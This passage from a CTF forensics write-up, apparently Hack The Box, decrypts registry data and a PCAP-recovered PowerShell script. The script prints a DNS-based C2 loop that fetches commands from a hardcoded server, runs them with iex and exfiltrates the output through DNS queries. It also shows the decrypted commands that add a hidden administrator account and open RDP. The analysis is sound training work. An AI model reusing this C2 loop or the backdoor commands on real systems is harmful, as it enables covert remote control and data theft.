HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL</span></span><br><span class="line"><span class="variable">$encrypted2</span> = <span class="string">&quot;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW</span></span><br><span class="line"><span class="variable">$encrypted3</span> = <span class="string">&quot;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da</span></span><br><span class="line"><span class="variable">$encrypted4</span> = <span class="string">&quot;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl</span></span><br><span class="line"><span class="variable">$encrypted5</span> = <span class="string">&quot;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C</span></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$encrypted1</span>)<span class="variable">$</span>(<span class="variable">$encrypted2</span>)<span class="variable">$</span>(<span class="variable">$encrypted3</span>)<span class="variable">$</span>(<span class="variable">$encrypted4</span>)<span class="variable">$</span>(<span class="variable">$encrypted5</span>)&quot;</span></span><br><span class="line"><span class="variable">$enc</span> = [<span class="type">System.Text.Encoding</span>]::ASCII</span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$data</span> = HexToBin <span class="variable">$encrypted</span></span><br><span class="line"><span class="variable">$DecryptedBytes</span> = encr <span class="variable">$data</span> <span class="variable">$key</span></span><br><span class="line"><span class="variable">$DecryptedString</span> = <span class="variable">$enc</span>.GetString(<span class="variable">$DecryptedBytes</span>)</span><br><span class="line"><span class="variable">$DecryptedString</span></span><br></pre></td></tr></table></figure>

<p>Now if we run this it’s supposed to print the flag for us but for some reasons it didn’t work for me so I did it with <strong>CyberChef</strong> instead. I used <code>RC4</code> to decrypt with the : </p>
<ul>
<li>input being the values we got from the registry keys</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4DD814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D184AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB</span><br></pre></td></tr></table></figure>

<ul>
<li>Passphrase we found in the script</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q0mmpr4B5rvZi3<span class="built_in">pS</span></span><br></pre></td></tr></table></figure>

<p>If we do so , we get our flag.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7cfe7cae-436c-43b1-9710-271a33156df7%2FUntitled.png?id=d2778d4c-6b96-4da4-b760-c45686f37cfc&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p><code>Flag : HTB&#123;g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh&#125;</code></p>
<hr>
<h2 id="Automation"><a href="#Automation" class="headerlink" title="Automation"></a>Automation</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Miyuki&#x27;s team stores all the evidence from important cases in a shared RAID 5 disk. Especially now that the case IMW-1337 is almost completed, evidences and clues are needed more than ever. Unfortunately for the team, an electromagnetic pulse caused by Draeger&#x27;s EMP cannon has partially destroyed the disk. Can you help her and the rest of team recover the content of the failed disk? Download: http://134.209.177.115/forensics/forensics_intergalactic_recovery.zip</span><br></pre></td></tr></table></figure>

<p>We are given a <code>capture.pcap</code> which we can open in Wireshark </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd64d791b-c925-48b7-bb0b-f0d56bfe779e%2FUntitled.png?id=d9e4f0ad-f9c2-4945-aaa2-5214eb38d18f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>There are different protocols used in this one like TCP and DNS </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6157a892-f0ac-48a2-9091-c9f3650336b2%2FUntitled.png?id=ad1caaf4-5b68-438f-9249-e104ed024924&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>Let’s try to follow some TCP streams </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1102c00c-59a5-44ac-9278-3f35da0010b5%2FUntitled.png?id=4dd0a7e5-0edc-4548-a287-a5524f8beb71&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>I started going through each stream until I found this one which is TCP stream number 17</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F44c66533-0215-4016-8fb2-90b88188d32c%2FUntitled.png?id=897533f0-1cd9-4f42-ba27-9d215531caad&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>It contains a base64 encoded value. I saved it in a file and decoded it in my terminal </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F01ae81eb-98a2-402e-96c4-533a099280b5%2FUntitled.png?id=62416bbf-df70-496d-a479-5df3ce053c1f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1470&userId=&cache=v2" alt="forensics"></p>
<p>It is a PowerShell script </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Create-AesManagedObject</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$IV</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$aesManaged</span> = <span class="built_in">New-Object</span> <span class="string">&quot;System.Security.Cryptography.AesManaged&quot;</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line">    <span class="variable">$aesManaged</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::Zeros</span><br><span class="line">    <span class="variable">$aesManaged</span>.BlockSize = <span class="number">128</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.KeySize = <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$IV</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$IV</span>.getType().Name <span class="operator">-eq</span> <span class="string">&quot;String&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$IV</span>)</span><br><span class="line">     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = <span class="variable">$IV</span></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$key</span>.getType().Name <span class="operator">-eq</span> <span class="string">&quot;String&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$key</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = <span class="variable">$key</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$aesManaged</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Create-AesKey</span><span class="params">()</span></span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$aesManaged</span>.Key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt-String</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$unencryptedString</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$unencryptedString</span>)</span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span></span><br><span class="line">    <span class="variable">$encryptor</span> = <span class="variable">$aesManaged</span>.CreateEncryptor()</span><br><span class="line">    <span class="variable">$encryptedData</span> = <span class="variable">$encryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length);</span><br><span class="line">    [<span class="built_in">byte</span>[]] <span class="variable">$fullData</span> = <span class="variable">$aesManaged</span>.IV + <span class="variable">$encryptedData</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.BitConverter</span>]::ToString(<span class="variable">$fullData</span>).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt-String</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$encryptedStringWithIV</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encryptedStringWithIV</span>)</span><br><span class="line">    <span class="variable">$IV</span> = <span class="variable">$bytes</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    <span class="variable">$decryptor</span> = <span class="variable">$aesManaged</span>.CreateDecryptor();</span><br><span class="line">    <span class="variable">$unencryptedData</span> = <span class="variable">$decryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">16</span>, <span class="variable">$bytes</span>.Length - <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$unencryptedData</span>).Trim([<span class="built_in">char</span>]<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">filter</span> parts(<span class="variable">$query</span>) &#123; <span class="variable">$t</span> = <span class="variable">$_</span>; <span class="number">0</span>..[<span class="type">math</span>]::floor(<span class="variable">$t</span>.length / <span class="variable">$query</span>) | % &#123; <span class="variable">$t</span>.substring(<span class="variable">$query</span> * <span class="variable">$_</span>, [<span class="type">math</span>]::min(<span class="variable">$query</span>, <span class="variable">$t</span>.length - <span class="variable">$query</span> * <span class="variable">$_</span>)) &#125;&#125; </span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;a1E4MUtycWswTmtrMHdqdg==&quot;</span></span><br><span class="line"><span class="variable">$out</span> = <span class="built_in">Resolve-DnsName</span> <span class="literal">-type</span> TXT <span class="literal">-DnsOnly</span> windowsliveupdater.com <span class="literal">-Server</span> <span class="number">147.182</span>.<span class="number">172.189</span>|<span class="built_in">Select-Object</span> <span class="literal">-Property</span> Strings;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$num</span> = <span class="number">0</span> ; <span class="variable">$num</span> <span class="operator">-le</span> <span class="variable">$out</span>.Length<span class="literal">-2</span>; <span class="variable">$num</span>++)&#123;</span><br><span class="line"><span class="variable">$encryptedString</span> = <span class="variable">$out</span>[<span class="variable">$num</span>].Strings[<span class="number">0</span>]</span><br><span class="line"><span class="variable">$backToPlainText</span> = Decrypt<span class="literal">-String</span> <span class="variable">$key</span> <span class="variable">$encryptedString</span></span><br><span class="line"><span class="variable">$output</span> = <span class="built_in">iex</span> <span class="variable">$backToPlainText</span>;<span class="variable">$pr</span> = Encrypt<span class="literal">-String</span> <span class="variable">$key</span> <span class="variable">$output</span>|parts <span class="number">32</span></span><br><span class="line"><span class="built_in">Resolve-DnsName</span> <span class="literal">-type</span> A <span class="literal">-DnsOnly</span> start.windowsliveupdater.com <span class="literal">-Server</span> <span class="number">147.182</span>.<span class="number">172.189</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ans</span> = <span class="number">0</span>; <span class="variable">$ans</span> <span class="operator">-lt</span> <span class="variable">$pr</span>.length<span class="literal">-1</span>; <span class="variable">$ans</span>++)&#123;</span><br><span class="line"><span class="variable">$domain</span> = <span class="operator">-join</span>(<span class="variable">$pr</span>[<span class="variable">$ans</span>],<span class="string">&quot;.windowsliveupdater.com&quot;</span>)</span><br><span class="line"><span class="built_in">Resolve-DnsName</span> <span class="literal">-type</span> A <span class="literal">-DnsOnly</span> <span class="variable">$domain</span> <span class="literal">-Server</span> <span class="number">147.182</span>.<span class="number">172.189</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">Resolve-DnsName</span> <span class="literal">-type</span> A <span class="literal">-DnsOnly</span> end.windowsliveupdater.com <span class="literal">-Server</span> <span class="number">147.182</span>.<span class="number">172.189</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>that is doing an encryption and decryption using a specific key. If we change it a little bit we may get something so let’s try. First, let’s find the encrypted strings. I assumed that they can be found in the DNS packets since the script is referring to them at the end with the IP address being <code>147.182.172.189</code> . So I immediately went to Wireshark and filtered by the IP address as a source address.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F722ca024-6ee2-4122-91a8-a628b6aaaf7c%2FUntitled.png?id=89844d8e-6b6a-4b22-ac80-7373ca203fbe&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>I noticed this file which contains what it looks like a base64 encoded strings </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff586425b-3025-4fe6-882b-af32342b1931%2FUntitled.png?id=34ec40b0-643d-419d-965c-b9eac92905f6&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>I exported them and I added them in an array in the <code>encryptedString</code> variable </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$encryptedString</span> = (<span class="string">&quot;Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=&quot;</span>,<span class="string">&quot;hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=&quot;</span>,<span class="string">&quot;58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=&quot;</span>,<span class="string">&quot;eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru&quot;</span>,<span class="string">&quot;BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=&quot;</span>,<span class="string">&quot;vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=&quot;</span>,<span class="string">&quot;M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Then I added a simple loop to go through the <code>$encryptedString</code> and decrypt each value with the <code>$key</code> </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$es</span> <span class="keyword">in</span> <span class="variable">$encryptedString</span>) &#123;</span><br><span class="line">        <span class="variable">$backToPlainText</span> = Decrypt<span class="literal">-String</span> <span class="variable">$key</span> <span class="variable">$es</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$backToPlainText</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Now we have all the pieces to re-construct the script.</p>
<p><strong>Final script</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Create-AesManagedObject</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$IV</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$aesManaged</span> = <span class="built_in">New-Object</span> <span class="string">&quot;System.Security.Cryptography.AesManaged&quot;</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line">    <span class="variable">$aesManaged</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::Zeros</span><br><span class="line">    <span class="variable">$aesManaged</span>.BlockSize = <span class="number">128</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.KeySize = <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$IV</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$IV</span>.getType().Name <span class="operator">-eq</span> <span class="string">&quot;String&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$IV</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = <span class="variable">$IV</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$key</span>.getType().Name <span class="operator">-eq</span> <span class="string">&quot;String&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$key</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = <span class="variable">$key</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$aesManaged</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt-String</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$encryptedStringWithIV</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encryptedStringWithIV</span>)</span><br><span class="line">    <span class="variable">$IV</span> = <span class="variable">$bytes</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    <span class="variable">$decryptor</span> = <span class="variable">$aesManaged</span>.CreateDecryptor();</span><br><span class="line">    <span class="variable">$unencryptedData</span> = <span class="variable">$decryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">16</span>, <span class="variable">$bytes</span>.Length - <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$unencryptedData</span>).Trim([<span class="built_in">char</span>]<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;a1E4MUtycWswTmtrMHdqdg==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encryptedString</span> = (<span class="string">&quot;Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=&quot;</span>,<span class="string">&quot;hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=&quot;</span>,<span class="string">&quot;58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=&quot;</span>,<span class="string">&quot;eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru&quot;</span>,<span class="string">&quot;BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=&quot;</span>,<span class="string">&quot;vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=&quot;</span>,<span class="string">&quot;M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$es</span> <span class="keyword">in</span> <span class="variable">$encryptedString</span>) &#123;</span><br><span class="line">        <span class="variable">$backToPlainText</span> = Decrypt<span class="literal">-String</span> <span class="variable">$key</span> <span class="variable">$es</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$backToPlainText</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Let’s run the script with the command <code>pwsh</code> in linux </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fef6f7aa5-2db3-4959-949c-d5f132aa57de%2FUntitled.png?id=0dc97c3a-7471-4e1d-9575-c400b6a15135&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p><strong>Output</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br><span class="line">whoami</span><br><span class="line">ipconfig</span><br><span class="line">wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value</span><br><span class="line">net user DefaultUsr <span class="string">&quot;JHBhcnQxPSdIVEJ7eTB1X2M0bl8n&quot;</span> /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup <span class="string">&quot;Remote Desktop Users&quot;</span> /add DefaultUsr</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Terminal Server&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line">net <span class="built_in">start</span> TermService</span><br></pre></td></tr></table></figure>

<p>We got a base64 encoded strings <code>JHBhcnQxPSdIVEJ7eTB1X2M0bl8n</code> , let’s decode it </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ffef5046e-cc5b-4ef8-81bb-1618eb8c070a%2FUntitled.png?id=e2bbef00-c01e-404e-b346-e7d73721936a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1090&userId=&cache=v2" alt="forensics"></p>
<p>We found the first part of the flag</p>
<p><code>$part1=&#39;HTB&#123;y0u_c4n_&#39;</code> </p>
<p>Let’s now look for the second part. </p>
<p>Going back to the DNS packets in the capture I noticed that there are hex values appended to the domain name.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fdc6794b3-d881-4391-b743-d920a18471d5%2FUntitled.png?id=cd582a4b-71e8-4577-8ca5-3562e9885d19&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>I went through all the DNS packets that have those hex values and extracted them. By doing so I got the following value </p>
